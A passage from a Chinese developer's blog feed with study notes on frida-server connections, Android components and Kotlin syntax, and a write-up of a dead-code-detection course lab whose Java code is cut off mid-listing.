的原理就是运行进程来监听安卓设备的一个端口，然后frida就是去连接安卓设备对应的端口并发送信息，<code>frida-server</code> 通过端口接收数据并执行操作。所以可能 objection 的 <code>-S</code> 选择设备只会采用默认的 <code>frida-server</code> 端口去连接。</p>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Android第一行代码</title>
    <link href="/posts/f131ce6d.html"/>
    <url>/posts/f131ce6d.html</url>
    
    <content type="html"><![CDATA[<h1 id="认识android"><a class="markdownIt-Anchor" href="#认识android"></a> 认识Android</h1><h2 id="系统架构"><a class="markdownIt-Anchor" href="#系统架构"></a> 系统架构</h2><p>​书中Android的架构总共为4层，分别为Linux内核层、系统运行库层、应用框架层、应用层。而下面这两篇文章，更倾向于按照官方图示分为五层，分别为Linux内核层、硬件抽象层HAL层、Native C/C++库 &amp;&amp; Android Runtime层、Java Framework层、 System Apps层。其中</p><ul><li><a href="https://cloud.tencent.com/developer/article/1415759">https://cloud.tencent.com/developer/article/1415759</a></li><li><a href="https://github.com/Omooo/Android-Notes/blob/master/blogs/Android/Framework/Android%20%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84.md">https://github.com/Omooo/Android-Notes/blob/master/blogs/Android/Framework/Android 系统架构.md</a></li></ul><h1 id="android四大组件"><a class="markdownIt-Anchor" href="#android四大组件"></a> Android四大组件</h1><blockquote><p>主要是了解一下，主要还是为了逆向而服务，感觉目前没什么作用的就没有细看，笔记很粗略</p></blockquote><h2 id="activity"><a class="markdownIt-Anchor" href="#activity"></a> Activity</h2><ul><li>任何一个活动都需要在 AndroidManifest.xml 中进行注册，<code>&lt;intent-filter&gt;</code> 中会标识活动的相关信息。</li><li>同时 <code>Intent</code> 是安卓各组件之间进行交互的一种重要方式，可以在不同活动之间进行数据的传输，分为显示Intent与隐式Intent。显示就是真实调用代码；隐式则是通过标注 <code>&lt;intent-filter&gt;</code> 中的信息来通过这些信息来表明自身，以供别人通过信息进行调用。隐式可以实现很多功能，因为可以标注的信息不同，所以可以实现打开浏览器、电话等操作。</li></ul><h3 id="活动的生命周期"><a class="markdownIt-Anchor" href="#活动的生命周期"></a> 活动的生命周期</h3><p>​Android使用任务来管理活动的，一个任务就是一组存放在栈里的活动的集合，这个栈也称为返回栈。创建活动即入栈，销毁活动栈顶数据就出栈。</p><p>​同时Android的活动状态分为4钟。运行状态(位于栈顶)、暂停状态(不在栈顶但仍可见、例如不占满整个屏幕的对话框，后面的活动就是暂停状态)、停止状态(不在栈顶并完全不可见)、销毁状态(从栈中移除)。</p><p>​由此可以根据活动的生存期获取7个回调方法。<code>Android逆向入门(1)</code>一节中有提及，它分为了完整生存期、可见生存期、前台生存期，还有一个落单的 <code>onRestart()</code> 方法(由活动由停止状态变为运行状态被调用，活动被重新启动了)。</p><ul><li>完整生存期：<code>onCreat()</code> 和 <code>onDestroy()</code> 之间，前者初始化，后者销毁</li><li>可见生存期：<code>onStart()</code> 和 <code>onStop()</code> 之间，前者资源加载，后者资源释放，从而保证不会占用过多内存</li><li>前台生存期：<code>onResume()</code> 和 <code>onPause()</code> 之间，这个期间，活动可见可交互</li></ul><h3 id="活动的启动方式"><a class="markdownIt-Anchor" href="#活动的启动方式"></a> 活动的启动方式</h3><ul><li>standard模式：标准默认的模式，每启动一个活动就入栈，不论活动是否已经被启用。</li><li>singleTop模式：活动启动前进行检查，如果<strong>返回栈栈顶</strong>已经是该活动了(需要注意只会检查栈顶，不再栈顶依然会再创建一个活动实例)，就认为可以直接使用，不再启动新的活动入栈。</li><li>singleTask模式：很好解决重复创建栈顶活动问题，检查<strong>返回栈</strong>中是否有相同的活动，有就不新创建活动实例。</li><li>singleInstance模式：解决共享活动实例问题，为共享的活动启用一个新的返回栈，其他程序访问这个活动会共用一个返回栈，实现了共享活动。因为这里每个程序都有自己的返回栈，这个活动在多个返回栈中创建的实例是不一样的，不能达到共享的目的。</li></ul><h2 id="broadcast-receiver"><a class="markdownIt-Anchor" href="#broadcast-receiver"></a> Broadcast Receiver</h2><p>​为了便于进行系统级别的消息通知，Android引入了一套类似的广播消息机制。这里分为标准广播和有序广播，前者广播发出后，所有广播接收器几乎同一时间接收到广播；后者广播发出后，同一时间只会有一个广播接收器能够收到这条广播消息，当这个广播接收器中的逻辑执行完毕后，广播才会继续传递。</p><h3 id="接收系统广播"><a class="markdownIt-Anchor" href="#接收系统广播"></a> 接收系统广播</h3><p>​这里广播的注册(注册之后，接收器就会收到对应的广播来处理)和 Intent 相似，动态注册就在代码中注册，静态注册则是在 AndroidManifest.xml 中注册(<code>&lt;receiver&gt;</code>标签中)。这里的广播需要与 <code>&lt;intent-filter&gt;</code> 进行配合，因为广播的类型是通过 Intent 来进行标注的，传递的其实也是这个。</p><h2 id="持久化技术"><a class="markdownIt-Anchor" href="#持久化技术"></a> 持久化技术</h2><p>​这里主要讲的就是存储持久化技术，它提供一种机制可以让数据在瞬时状态和持久状态之间进行转换。</p><h3 id="文件存储"><a class="markdownIt-Anchor" href="#文件存储"></a> 文件存储</h3><p>​使用 Content 类提供的方法 <code>openFileOutput()</code> 和 <code>openFileInput()</code>，前者第一个参数是文件名，不可以包含路径，因为所有的文件默认都是存储在 <code>/data/data/&lt;package name&gt;/files</code> 目录下的。</p><h3 id="sharedpreferences存储"><a class="markdownIt-Anchor" href="#sharedpreferences存储"></a> SharedPreferences存储</h3><p>​它是使用的键值对的方式来存储数据的。它使用 <code>SharedPreferences 对象</code> 来存储数据。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202403031117688.png" alt="image-20240303111754614" /></p><h3 id="sqlite数据库存储"><a class="markdownIt-Anchor" href="#sqlite数据库存储"></a> SQLite数据库存储</h3><p>​就是使用数据库进行的一系列操作，这里没怎么看</p><h2 id="content-provider"><a class="markdownIt-Anchor" href="#content-provider"></a> Content Provider</h2><p>​Content Provider主要用于在不同的应用程序之间实现数据共享的功能。</p><h3 id="运行时权限"><a class="markdownIt-Anchor" href="#运行时权限"></a> 运行时权限</h3><p>​对于程序需要的权限，用户不需要一次性授权全部申请的权限，而是可以在软件的使用过程中再对某一项权限申请进行授权。</p><h3 id="content-provider-2"><a class="markdownIt-Anchor" href="#content-provider-2"></a> content provider</h3><p>​使用 uri(example:content://com.example.app.provider/table1)来表示路径进行访问，从而可以使用同一个文件。</p><h2 id="service"><a class="markdownIt-Anchor" href="#service"></a> Service</h2><p>​服务会执行不需要和用户交互而且要求长期运行的任务。</p><h3 id="异步消息处理机制"><a class="markdownIt-Anchor" href="#异步消息处理机制"></a> 异步消息处理机制</h3><ul><li>Message：在线程中传递的消息，可以在内部携带少量信息，用于不同线程之间交互数据。</li><li>Handle：主要用于发送和处理消息 -&gt; <code>sendMessage()</code> 和 <code>handleMessage()</code>。</li><li>MessageQueue：消息队列，存放所有通过Handle发送的消息，这部分消息会存在于队列中，等待被处理。每个线程中只有一个 MessageQueue对象</li><li>Looper：每个线程中 MessageQueue 的管家，调用它的 <code>loop()</code> 方法后，就会进入一个无限的循环中，然后每当发现 MessageQueue 中存在一条消息，就会取出，然后传递给 Handle 的 handleMessage() 方法中，每个线程中也只存在一个looper对象。</li></ul><p>​首先需要在主线程当中创建一个 Handler 对象，并重写 handleMessage() 方法。然后当子线程中需要进行UI操作时，就创建一个 Message 对象，并通过 Handler 将这条消息发送出去。之后这条消息会被添加到 MessageQueue 的队列中等待被处理。而 Looper 则会一直尝试从 MessageQueue 中取出待处理消息，最后分发回 Handler 的 handleMessage() 方法中。由于 Handler 是在主线程中创建的，所以此时 handleMessage() 方法中的代码也会在主线程中运行，于是我们在这里就可以安心地进行 UI操作了。(示例如下图)</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202403031509228.png" alt="image-20240303150909138" /></p><h1 id="kotlin学习"><a class="markdownIt-Anchor" href="#kotlin学习"></a> Kotlin学习</h1><h2 id="基础相关"><a class="markdownIt-Anchor" href="#基础相关"></a> 基础相关</h2><h3 id="变量"><a class="markdownIt-Anchor" href="#变量"></a> 变量</h3><ul><li><code>val</code> 类似与final，标识变量不可更改</li><li><code>var</code> kotlin会自动推断数据类型，或者也可以显示声明变量</li></ul><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> main&#123;</span><br>    <span class="hljs-keyword">val</span> a:<span class="hljs-built_in">Int</span> = <span class="hljs-number">1</span> <span class="hljs-comment">//显示声明变量，注意这里 Int 的首字母大写，表明它是一个对象，它已经抛弃了的java的int等基本数据类型，完全使用对象表示数据类型</span><br>    <span class="hljs-keyword">var</span> b = <span class="hljs-number">1.5</span><br>    b = b * <span class="hljs-number">2</span><br>    println(<span class="hljs-string">&quot;num a is immutable: &quot;</span> + a)<br>    println(<span class="hljs-string">&quot;num b is variable: &quot;</span> + b)<br>&#125;<span class="hljs-comment">//kotlin不需要&quot;;&quot;结尾</span><br></code></pre></td></tr></table></figure><h3 id="函数"><a class="markdownIt-Anchor" href="#函数"></a> 函数</h3><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">methodName</span><span class="hljs-params">(param1: <span class="hljs-type">Int</span>, param2: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Int</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>&#125;<span class="hljs-comment">//这里参数的类型还是需要指定的，不过返回值可以推断出来而省略</span><br><br><span class="hljs-comment">// 函数体只有一行可以简化</span><br><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">largeNumber</span><span class="hljs-params">(num1: <span class="hljs-type">Int</span>, num2: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Int</span> = max(num1, num2)<br></code></pre></td></tr></table></figure><h3 id="逻辑控制"><a class="markdownIt-Anchor" href="#逻辑控制"></a> 逻辑控制</h3><h4 id="if语句"><a class="markdownIt-Anchor" href="#if语句"></a> if语句</h4><p>​与java类似，但是可以存在返回值，返回值就是if语句每一个条件中最后一行代码的返回值</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">largerNumber</span><span class="hljs-params">(num1: <span class="hljs-type">Int</span>, num2: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Int</span> &#123;<br>    <span class="hljs-keyword">var</span> value = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> (num1 &gt; num2) &#123;<br>        value = num1<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        value = num2<br>    &#125;<br>    <span class="hljs-comment">//上下相同</span><br>    <span class="hljs-keyword">var</span> value <span class="hljs-keyword">if</span> (num1 &gt; num2) &#123;<br>        num1<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        num2<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> value<br>&#125;<br><br><br><span class="hljs-comment">//再压缩，只有一行代码的情况下</span><br><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">largerNumber</span><span class="hljs-params">(num1: <span class="hljs-type">Int</span>, num2: <span class="hljs-type">Int</span>)</span></span> = <span class="hljs-keyword">if</span> (num1 &gt; num2) num1 <span class="hljs-keyword">else</span> num2<br></code></pre></td></tr></table></figure><h4 id="when语句"><a class="markdownIt-Anchor" href="#when语句"></a> when语句</h4><p>​类似java的switch语句</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getScore</span><span class="hljs-params">(name: <span class="hljs-type">String</span>)</span></span> = <span class="hljs-keyword">when</span> (name) &#123;<br>    <span class="hljs-string">&quot;Tom&quot;</span> -&gt; <span class="hljs-number">86</span><br>    <span class="hljs-string">&quot;Jim&quot;</span> -&gt; <span class="hljs-number">77</span><br>    <span class="hljs-string">&quot;Jack&quot;</span> -&gt; <span class="hljs-number">95</span><br>    <span class="hljs-string">&quot;Lily&quot;</span> -&gt; <span class="hljs-number">100</span><br>    <span class="hljs-keyword">else</span> -&gt; <span class="hljs-number">0</span><br>&#125;<span class="hljs-comment">//返回值省略了，为Int。这里就是根据name的值确定返回值</span><br><br><span class="hljs-comment">//同时支持类型匹配，Number为内置的数据类型，Int，Long等都是它的子类</span><br><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">checkNumber</span><span class="hljs-params">(num: <span class="hljs-type">Number</span>)</span></span> &#123;<br>    <span class="hljs-keyword">when</span> (num) &#123;<br>        <span class="hljs-keyword">is</span> <span class="hljs-built_in">Int</span> -&gt; println(<span class="hljs-string">&quot;number is Int&quot;</span>)<br>        <span class="hljs-keyword">is</span> <span class="hljs-built_in">Double</span> -&gt; println(<span class="hljs-string">&quot;number is Double&quot;</span>)<br>        <span class="hljs-keyword">else</span> -&gt; println(<span class="hljs-string">&quot;number not support&quot;</span>)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="循环语句"><a class="markdownIt-Anchor" href="#循环语句"></a> 循环语句</h4><p>​while差不多，for与java相比有改变</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">0.</span><span class="hljs-number">.10</span>) &#123;<span class="hljs-comment">//..是创建两端闭区间的关键字，这里就是创建了[0,10]</span><br>        println(i)<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">0</span> until <span class="hljs-number">10</span> step <span class="hljs-number">2</span>) &#123;<span class="hljs-comment">//[0,10)</span><br>        println(i)<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">10</span> downTo <span class="hljs-number">1</span>) &#123;<span class="hljs-comment">//降序[10,1]</span><br>        println(i)<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="类"><a class="markdownIt-Anchor" href="#类"></a> 类</h2><h3 id="继承关系"><a class="markdownIt-Anchor" href="#继承关系"></a> 继承关系</h3><p>​kotlin的类都是默认非抽象类，不能被继承(类似java中final)。所以，要表示一个类可以继承，必须加上 <code>open</code> ，同时kotlin中的继承为 <code>:</code>，后面 Person() 意识是调用的 Person类的无参主构造函数，子类的主构造函数调用父类中的哪个构造函数，在继承的时候通过括号来指定。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">open</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    ...<br>&#125;<br><br><span class="hljs-comment">//Person类后面的一对空括号表示Student类的主构造函数在初始化的时候会调用Person类的无参数构造函数</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> : <span class="hljs-type">Person</span>() &#123;<br>    <span class="hljs-keyword">var</span> sno = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">var</span> grade = <span class="hljs-number">0</span><br>&#125;<br><br><span class="hljs-comment">//这里主构造函数有两个参数，没有无参构造函数了，他没有函数体。后面init是次构造函数，可以写入逻辑</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-keyword">val</span> name: String, <span class="hljs-keyword">val</span> age: <span class="hljs-built_in">Int</span>)&#123;<br><span class="hljs-keyword">init</span>&#123;<br>        println(<span class="hljs-string">&quot;name is: &quot;</span> + name)<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>(<span class="hljs-keyword">val</span> sno: String, <span class="hljs-keyword">val</span> grade: <span class="hljs-built_in">Int</span>, name: String): Person(name)&#123;<span class="hljs-comment">//这里需要实现父类的构造函数，就是使用括号来实现，name是父类的参数，不写关键字，让作用域仅限定在主构造函数</span><br>    ...<br>&#125;<br><br></code></pre></td></tr></table></figure><p>​一个类只有一个主构造函数，但是可以存在多个次构造函数。当一个类既有主构造函数，又有次构造函数时，所有的次构造函数都必须调用主构造函数(包括间接调用)</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>(<span class="hljs-keyword">val</span> sno: String, <span class="hljs-keyword">val</span> grade: <span class="hljs-built_in">Int</span>, name: String, age: <span class="hljs-built_in">Int</span>): Person(name, age) &#123;<br>    <span class="hljs-keyword">constructor</span>(name: String, age: <span class="hljs-built_in">Int</span>) : <span class="hljs-keyword">this</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">0</span>, name, age) &#123;<br>    <br>    &#125;<br>    <span class="hljs-keyword">constructor</span>() : <span class="hljs-keyword">this</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">0</span>) &#123;<br>    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​次构造函数是通过constructor关键字来定义的，这里我们定义了两个次构造函数：第一个次构造函数接收name和age参数，然后它又通过this关键字调用了主构造函数，并将sno和grade这两个参数赋值成初始值；第二个次构造函数不接收任何参数，它通过this关键字调用了我们刚才定义的第一个次构造函数，并将name和age参数也赋值成初始值，由于第二个次构造函数间接调用了主构造函数，因此这仍然是合法的。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">val</span> student1 = Student()<br><span class="hljs-keyword">val</span> student2 = Student(<span class="hljs-string">&quot;Jack&quot;</span>, <span class="hljs-number">19</span>)<br><span class="hljs-keyword">val</span> student3 = Student(<span class="hljs-string">&quot;a123&quot;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&quot;Jack&quot;</span>, <span class="hljs-number">19</span>)<br></code></pre></td></tr></table></figure><p>​然后就拥有了3种方式来对Student类进行实体化，分别是通过不带参数的构造函数、通过带两个参数的构造函数和通过带4个参数的构造函数</p><blockquote><p>这里还是有点迷糊，无参的构造函数哪里来的，两个参数的又是哪里的</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>《软件分析》Lab3</title>
    <link href="/posts/ecb00fb5.html"/>
    <url>/posts/ecb00fb5.html</url>
    
    <content type="html"><![CDATA[<h1 id="相关配置"><a class="markdownIt-Anchor" href="#相关配置"></a> 相关配置</h1><h2 id="java配置"><a class="markdownIt-Anchor" href="#java配置"></a> java配置</h2><ol><li>设置 <code>Settings -&gt; Project Structure -&gt; SDK: java17 -- Language level: 17 - Sealed types, always-strict floating-point semantics</code></li><li>设置 <code>Settings -&gt; Build,Execution,Deployment -&gt; Gradle -&gt; Build and run using: interlliJ IDEA(下面那个也一样)</code></li></ol><h2 id="dot-png"><a class="markdownIt-Anchor" href="#dot-png"></a> dot-&gt;png</h2><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos">dot -Tpng <span class="hljs-built_in">tree</span>.dot -o <span class="hljs-built_in">tree</span>.png<br># 其中<span class="hljs-built_in">tree</span>.dot为dot形式名称，<span class="hljs-built_in">tree</span>.png为图片png形式名称<br></code></pre></td></tr></table></figure><h1 id="lab3"><a class="markdownIt-Anchor" href="#lab3"></a> Lab3</h1><h2 id="理解"><a class="markdownIt-Anchor" href="#理解"></a> 理解</h2><ul><li>这次实验是在参考别人的残缺代码后，跟着样例一步一步实现的</li><li>这里通过 visited 来对 cfg 中可以到达的 stmt 进行添加，注意 HashSet 无序不重复</li><li>这里需要注意对于 IF 语句的跳转，即遍历 cfg 的过程中，遇到正确的 if 语句进行跳转，这样就可以剔除错误的分支，switch 也是一样的道理，而对于无用赋值，只需要考虑它的条件进行删除即可</li><li>注意 Entry 和 Exit 需要从 deadCode 中删除，后者不会被 visited 访问到，所以需要手动从 deadCode 中删除</li></ul><p>PS: 过了本地样例就提交了，然后居然过了。本来以为fall-through不对的，后来看自己写的样例的三地址码，发现如果没有break的话，我的代码会按顺序执行，也就是说向下继续执行，这样就解决了fall-through的问题</p><h2 id="题目相关"><a class="markdownIt-Anchor" href="#题目相关"></a> 题目相关</h2><blockquote><p>实现死代码检测算法</p></blockquote><p>​死代码指的是程序中不可达的(unreachable)代码(即不会被执行的代码)，或者是执行结果永远不会被其他计算过程用到的代码。去除死代码可以在不影响程序输出的前提下简化程序、提高效率。在本次作业中，我们只关注两种死代码：<strong>不可达代码</strong>(unreachable code)和<strong>无用赋值</strong>(dead assignment)。</p><p>​不可达代码分为控制流不可达代码和分支不可达代码，需要使用遍历CFG图和常量传播，而无用赋值则需要使用活跃变量分析，剔除非活跃变量。</p><h2 id="死代码检测"><a class="markdownIt-Anchor" href="#死代码检测"></a> 死代码检测</h2><h3 id="analysis"><a class="markdownIt-Anchor" href="#analysis"></a> analysis</h3><ul><li><code>pascal.taie.analysis.graph.cfg.Edge</code><ul><li>这个类表示CFG的边，可以通过 <code>getkind()</code> 方法获得这个边的种类，例如IF_TRUE<code>、</code>IF_FALSE<code>、</code>SWITCH_CASE和SWITCH_DEFAULT。</li></ul></li></ul><h3 id="ir"><a class="markdownIt-Anchor" href="#ir"></a> ir</h3><ul><li><code>pascal.taie.ir.stmt.AssignStmt</code><ul><li>这个类表示程序中的赋值语句（比如 <code>x = ...;</code>）。这里需要对无用赋值语句可能产生的副作用而进行区分。本次作业中所有的无用赋值只可能是 AssignStmt 的实例。</li><li><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402292121185.png" alt="image-20240229212156070" /></li></ul></li></ul><h3 id="具体代码"><a class="markdownIt-Anchor" href="#具体代码"></a> 具体代码</h3><h4 id="代码总览"><a class="markdownIt-Anchor" href="#代码总览"></a> 代码总览</h4><p>​需要完成下面的方法</p><ul><li><code>Set&lt;Stmt&gt; analyze(IR)</code></li></ul><p>这个方法将一个 <code>IR</code> 作为输入，返回一个包含 <code>IR</code> 中死代码的集合。</p><h4 id="analyze"><a class="markdownIt-Anchor" href="#analyze"></a> analyze</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Set&lt;Stmt&gt; <span class="hljs-title function_">analyze</span><span class="hljs-params">(IR ir)</span> &#123;<br>       <span class="hljs-comment">// obtain CFG</span><br>       CFG&lt;Stmt&gt; cfg = ir.getResult(CFGBuilder.ID);<br>       <span class="hljs-comment">// obtain result of constant propagation</span><br>       DataflowResult&lt;Stmt, CPFact&gt; constants =<br>               ir.getResult(ConstantPropagation.ID);<br>       <span class="hljs-comment">// obtain result of live variable analysis</span><br>       DataflowResult&lt;Stmt, SetFact&lt;Var&gt;&gt; liveVars =<br>               ir.getResult(LiveVariableAnalysis.ID);<br>       <span class="hljs-comment">// keep statements (dead code) sorted in the resulting set</span><br>       Set&lt;Stmt&gt; deadCode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeSet</span>&lt;&gt;(Comparator.comparing(Stmt::getIndex));<br>       <span class="hljs-comment">// TODO - finish me</span><br>       <span class="hljs-comment">// Your task is to recognize dead code in ir and add it to deadCode、</span><br>       Queue&lt;Stmt&gt; stmtQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();<br>       Set&lt;Stmt&gt; visited = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();<br><br>       <span class="hljs-comment">// 将入口节点添加到队列和已访问集合中</span><br>       <span class="hljs-type">Stmt</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> cfg.getEntry();<br>       stmtQueue.add(cfg.getEntry());<br>       visited.add(entry);<br>       <span class="hljs-comment">// cfg出发，提出了所有的不可达语句</span><br>       <span class="hljs-keyword">while</span> (!stmtQueue.isEmpty()) &#123;<br>           <span class="hljs-type">Stmt</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> stmtQueue.poll();<br>           <span class="hljs-comment">// if 分支不可达</span><br>           <span class="hljs-keyword">if</span> (current <span class="hljs-keyword">instanceof</span> If s) &#123;<br>               <span class="hljs-comment">// 获取 if 中表达式的结果，evaluate用来处理当前表达式与输入值的返回结果</span><br>               <span class="hljs-type">Value</span> <span class="hljs-variable">ConditionValue</span> <span class="hljs-operator">=</span> ConstantPropagation.evaluate(s.getCondition(), constants.getInFact(current));<br>               <span class="hljs-keyword">if</span> (ConditionValue.isConstant()) &#123;<br>                   <span class="hljs-comment">// 如果是常量，判断是否有可达分支</span><br>                   <span class="hljs-keyword">for</span> (Edge&lt;Stmt&gt; edge : cfg.getOutEdgesOf(s)) &#123;<br>                       <span class="hljs-comment">// 判断 if 可达语句</span><br>                       <span class="hljs-keyword">if</span> ((ConditionValue.getConstant() == <span class="hljs-number">1</span> &amp;&amp; edge.getKind() == Edge.Kind.IF_TRUE) ||<br>                               ConditionValue.getConstant() == <span class="hljs-number">0</span> &amp;&amp; edge.getKind() == Edge.Kind.IF_FALSE) &#123;<br>                           <span 